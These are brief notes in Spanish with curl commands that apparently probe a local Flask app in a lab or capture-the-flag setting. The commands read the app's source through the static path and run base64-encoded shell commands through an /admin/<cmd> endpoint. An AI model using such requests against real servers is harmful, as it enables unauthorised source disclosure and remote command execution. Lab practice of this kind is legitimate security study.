curl -v --path-as-is 'http://localhost:5000/

Es flask

curl -v --path-as-is 'http://localhost:5000/static/'$(printf app.py | base64)

Tiene path /admin/<cmd>

curl -v --path-as-is 'http://localhost:5000/admin/'$(printf ls | base64)


